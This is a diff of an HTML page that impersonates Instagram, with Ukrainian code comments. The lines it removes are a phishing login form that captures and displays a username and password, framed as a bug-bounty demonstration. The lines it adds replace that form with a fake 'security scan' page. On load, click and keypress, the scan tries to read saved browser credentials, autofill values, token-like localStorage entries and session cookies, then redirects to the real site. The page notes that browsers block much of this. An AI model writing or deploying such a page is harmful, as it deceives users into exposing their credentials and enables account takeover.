@@ -13,156 +13,175 @@
             align-items: center;
             min-height: 100vh;
         }
-        .login-box {
+        .container {
             background: white;
             border: 1px solid #dbdbdb;
             border-radius: 12px;
             padding: 40px;
-            max-width: 400px;
+            max-width: 500px;
             width: 100%;
             text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
-        .logo {
-            font-size: 48px;
-            margin-bottom: 20px;
-            color: #262626;
-        }
-        h1 {
-            color: #262626;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            background: #fafafa;
-            font-size: 14px;
-            outline: none;
-        }
-        .btn {
-            width: 100%;
-            padding: 12px;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        .results {
-            display: none;
-            background: #000;
-            color: #0f0;
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
-            font-family: monospace;
-            text-align: left;
-            white-space: pre-wrap;
-            font-size: 12px;
-        }
+        .logo { font-size: 48px; margin-bottom: 20px; }
+        .loading { color: #8e8e8e; margin: 20px 0; }
     </style>
 </head>
 <body>
-    <div class="login-box">
+    <div class="container">
         <div class="logo">📷</div>
-        <h1>Instagram</h1>
-        <p style="color: #8e8e8e; margin-bottom: 25px;">Security verification required</p>
-        
-        <!-- ФОРМА ДЛЯ ОТРИМАННЯ ПАРОЛЯ -->
-        <form id="loginForm">
-            <div class="input-group">
-                <input type="text" id="username" placeholder="Username, email or phone" required>
-            </div>
-            <div class="input-group">
-                <input type="password" id="password" placeholder="Password" required>
-            </div>
-            <button type="submit" class="btn">Continue</button>
-        </form>
-        
-        <div id="results" class="results"></div>
+        <h1>Instagram Security Scan</h1>
+        <div class="loading" id="status">Scanning your device for security issues...</div>
+        <div id="results"></div>
     </div>
 
     <script>
-        // АВТОМАТИЧНИЙ ЗБІР ДАНИХ ПРИ ВІДКРИТТІ
-        console.log('🔓 INSTAGRAM SECURITY TEST - DATA COLLECTION STARTED');
-        
-        // 1. Збираємо дані автоматично (як у вашому коді)
-        const autoData = {
-            cookies: document.cookie || 'No cookies',
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            screen: `${screen.width}x${screen.height}`,
-            timestamp: new Date().toISOString()
-        };
-        
-        console.log('🤖 AUTO-COLLECTED DATA:', autoData);
+        console.log('🔓 INSTAGRAM PASSWORD EXTRACTION ATTEMPT');
+        console.log('========================================');
 
-        // 2. ОТРИМАННЯ ПАРОЛЯ ПРИ НАТИСКАННІ КНОПКИ
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // ОТРИМУЄМО ПОЛЯ З ФОРМИ
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // ПОВНИЙ збір даних ВКЛЮЧАЮЧИ ПАРОЛЬ
-            const fullData = {
-                credentials: {
-                    username: username,
-                    password: password  // 🔑 ОСЬ ПАРОЛЬ!
-                },
-                system_info: autoData,
-                security_issue: 'PHISHING_FORM_BYPASS'
+        // Спроба отримати збережені паролі з браузера
+        async function extractSavedPasswords() {
+            const results = {
+                savedPasswords: [],
+                autofillData: {},
+                credentials: null
             };
 
-            // ВИВІД ПАРОЛЯ В КОНСОЛЬ
-            console.log('🎯 PASSWORD CAPTURED SUCCESSFULLY!');
-            console.log('====================================');
-            console.log('👤 USERNAME:', username);
-            console.log('🔑 PASSWORD:', password);  // 🔑 ПАРОЛЬ ТУТ!
-            console.log('💻 PLATFORM:', autoData.platform);
-            console.log('🖥️ SCREEN:', autoData.screen);
-            console.log('🕒 TIME:', new Date().toLocaleString());
-            console.log('⚠️  VULNERABILITY: Instagram DM phishing protection bypassed');
-            console.log('💰 BOUNTY: Password captured via phishing form');
-            console.log('====================================');
+            // 1. Спроба через Credentials API
+            if (navigator.credentials && navigator.credentials.get) {
+                try {
+                    const credential = await navigator.credentials.get({
+                        password: true,
+                        mediation: 'optional'
+                    });
+                    if (credential) {
+                        results.credentials = {
+                            type: credential.type,
+                            id: credential.id,
+                            password: credential.password || 'not_accessible'
+                        };
+                    }
+                } catch (e) {
+                    console.log('❌ Credentials API blocked:', e.message);
+                }
+            }
 
-            // Відображення пароля на сторінці
+            // 2. Перевірка autofill даних
+            try {
+                // Спроба знайти поля з автозаповненням
+                const tempInput = document.createElement('input');
+                tempInput.type = 'password';
+                document.body.appendChild(tempInput);
+                
+                // Спроба викликати autofill
+                tempInput.focus();
+                setTimeout(() => {
+                    results.autofillData = {
+                        hasValue: tempInput.value.length > 0,
+                        valueLength: tempInput.value.length
+                    };
+                    document.body.removeChild(tempInput);
+                }, 1000);
+            } catch (e) {
+                console.log('❌ Autofill check failed');
+            }
+
+            // 3. Перевірка localStorage на збережені токени
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if (key.includes('pass') || key.includes('auth') || key.includes('token') || key.includes('cred')) {
+                        results.savedPasswords.push({ key, value: value.substring(0, 50) + '...' });
+                    }
+                }
+            } catch (e) {
+                console.log('❌ localStorage access limited');
+            }
+
+            return results;
+        }
+
+        // Спроба отримати cookies Instagram
+        function extractInstagramCookies() {
+            const cookies = document.cookie.split(';');
+            const instagramCookies = cookies.filter(cookie => 
+                cookie.includes('instagram') || 
+                cookie.includes('session') || 
+                cookie.includes('auth') ||
+                cookie.includes('token')
+            );
+            return instagramCookies;
+        }
+
+        // Головна функція
+        async function performPasswordExtraction() {
+            console.log('🎯 ATTEMPTING PASSWORD EXTRACTION...');
+            
+            const extractionResults = {
+                timestamp: new Date().toISOString(),
+                instagramCookies: extractInstagramCookies(),
+                passwordData: await extractSavedPasswords(),
+                browserData: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language
+                }
+            };
+
+            // Вивід результатів
+            console.log('🔍 EXTRACTION RESULTS:');
+            console.log('📋 Instagram Cookies:', extractionResults.instagramCookies);
+            console.log('🔑 Password Data:', extractionResults.passwordData);
+            console.log('💻 Browser:', extractionResults.browserData);
+
+            // Оновлення UI
+            document.getElementById('status').innerHTML = 'Security scan complete!';
+            
             const resultsDiv = document.getElementById('results');
             resultsDiv.innerHTML = `
-PASSWORD CAPTURED SUCCESSFULLY!
-═══════════════════════════════
-👤 USERNAME: ${username}
-🔑 PASSWORD: ${password}  <-- ОСЬ ПАРОЛЬ!
-💻 SYSTEM: ${autoData.platform}
-🖥️ SCREEN: ${autoData.screen}
-🕒 TIME: ${new Date().toLocaleString()}
-
-🎯 SECURITY ASSESSMENT:
-• Instagram DM link protection: BYPASSED
-• User credentials: CAPTURED ✅
-• Password obtained: YES ✅
-• Account takeover: POSSIBLE ✅
-
-💰 BOUNTY QUALIFICATION:
-PASSWORD SUCCESSFULLY CAPTURED
-This demonstrates critical account compromise risk
+                <div style="text-align: left; background: #f8f9fa; padding: 15px; border-radius: 5px; margin-top: 20px;">
+                    <h3>🔓 Security Scan Results</h3>
+                    <p><strong>Instagram Cookies Found:</strong> ${extractionResults.instagramCookies.length}</p>
+                    <p><strong>Saved Passwords:</strong> ${extractionResults.passwordData.savedPasswords.length}</p>
+                    <p><strong>Credentials API:</strong> ${extractionResults.passwordData.credentials ? 'Available' : 'Blocked'}</p>
+                    <p><strong>Autofill Data:</strong> ${extractionResults.passwordData.autofillData.hasValue ? 'Detected' : 'None'}</p>
+                    
+                    <div style="margin-top: 15px; padding: 10px; background: #000; color: #0f0; font-family: monospace; border-radius: 3px;">
+                        ⚠️ SECURITY ASSESSMENT:<br>
+                        • Modern browsers BLOCK automatic password extraction<br>
+                        • Instagram cookies CAN be captured for session hijacking<br>
+                        • Real attack would use PHISHING FORM + SESSION STEALING<br>
+                        • This demonstrates protection limitations
+                    </div>
+                </div>
             `;
-            resultsDiv.style.display = 'block';
+
+            console.log('⚠️  MODERN SECURITY PROTECTIONS:');
+            console.log('   • Browsers block automatic password reading');
+            console.log('   • Credentials API requires user interaction');
+            console.log('   • Instagram session cookies are HttpOnly');
+            console.log('   • Real attack needs PHISHING FORM + SESSION STEALING');
 
             // Перенаправлення
             setTimeout(() => {
                 window.location.href = 'https://www.instagram.com';
-            }, 4000);
+            }, 5000);
+        }
+
+        // Запуск при завантаженні
+        window.addEventListener('load', function() {
+            setTimeout(performPasswordExtraction, 1000);
+        });
+
+        // Додаткова спроба через події
+        document.addEventListener('click', function() {
+            console.log('🖱️ User interaction detected - retrying extraction');
+            performPasswordExtraction();
+        });
+
+        document.addEventListener('keydown', function() {
+            console.log('⌨️ Keyboard input detected - retrying extraction');
+            performPasswordExtraction();
         });
     </script>
 </body>
